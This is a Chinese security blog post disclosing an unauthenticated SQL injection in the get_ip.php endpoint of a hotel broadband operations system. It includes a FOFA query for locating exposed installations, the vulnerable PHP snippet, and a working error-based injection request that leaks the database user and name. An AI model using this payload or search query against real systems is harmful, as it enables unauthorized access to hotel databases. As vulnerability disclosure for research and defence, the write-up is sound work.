---
title: "安美数字酒店宽带运营系统 get_ip.php SQL注入漏洞"
source: https://mrxn.net/jswz/amttgroup-user-get_ip-vlanid-sqli.html
asset_dir: assets/安美数字酒店宽带运营系统-get_ip.php-sql注入漏洞
---

# 安美数字酒店宽带运营系统 get\_ip.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/16 08:31
* 750浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

鉴权

安全

script


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

安美数字酒店宽带运营系统的 get\_ip.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用SQL注入漏洞获取数据库中的信息之外，甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> `body="http://www.amttgroup.com/" && body="form.ManagerID.focus()"`

# 漏洞分析

user/get\_ip.php 业务逻辑如下

```
if (trim($gwip) == "" || trim($realip) == "") {
    echo "<script language=\"javascript\">\n";
    echo "alert(\"{$lang['prompt_invalid_req_opt']}\");\n";
    echo "</script>\n";
    exit;
}

$user_switch_stat = 2;
$vlanid = trim($vlanid);
if ($vlanid != "") {
    $db = new newDB();
    $sqlcmd  = "select SwitchIP, SwitchPort ";
    $sqlcmd .= "from T_Account where BindVlan='$vlanid' or AccountID='$vlanid'";
    if (($result = $db->query($sqlcmd)) == FALSE) {
       $user_switch_stat = 0;
    }
```

深入探索

VPN服务

SQL注入防护

网络安全课程

只需要 `$gwip` 和 `$realip` 不为空即可满足条件

代码安全审计

`$vlanid` 没有任何过滤校验操作，直接拼接进SQL语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /user/get_ip.php?vlanid=1'+and+extractvalue(1,concat(0x7e,user(),0x7e,database()))--+-&gwip=0&realip=0 HTTP/1.1
Host: amttgroup.mrxn.net
```

[![安美数字酒店宽带运营系统 get_ip.php SQL注入漏洞](images/img-001-b81ed96fba92.webp)](https://image.mrxn.net/1a03cd2c86744d3b919bae77da0244f1.webp)

通过报错注入成功在响应回显数据库用户和数据库名。

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[安美数字酒店宽带运营系统 get\_ip.php SQL注入漏洞](https://mrxn.net/jswz/amttgroup-user-get_ip-vlanid-sqli.html)  
文章链接：<https://mrxn.net/jswz/amttgroup-user-get_ip-vlanid-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/amttgroup-user-get\_ip-vlanid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
